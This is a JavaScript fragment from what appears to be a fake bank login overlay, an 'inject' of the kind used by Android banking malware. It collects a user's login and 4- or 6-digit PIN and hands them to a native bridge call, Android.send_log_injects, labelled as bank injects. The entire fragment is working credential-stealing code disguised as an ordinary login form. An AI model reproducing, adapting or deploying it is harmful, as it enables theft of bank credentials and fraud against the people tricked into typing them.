    <script>
        $('#password').mask('000000');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        var eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type === 'password') {
                password.type = 'text';
            } else {
                password.type = 'password';
            }
        }

        function checkInputs() {
            if(login.value.length >= 4 && password.value.length === 4 || login.value.length >= 4 && password.value.length === 6) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            checkInputs();
        }

        password.onkeyup = () => {
            checkInputs();
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
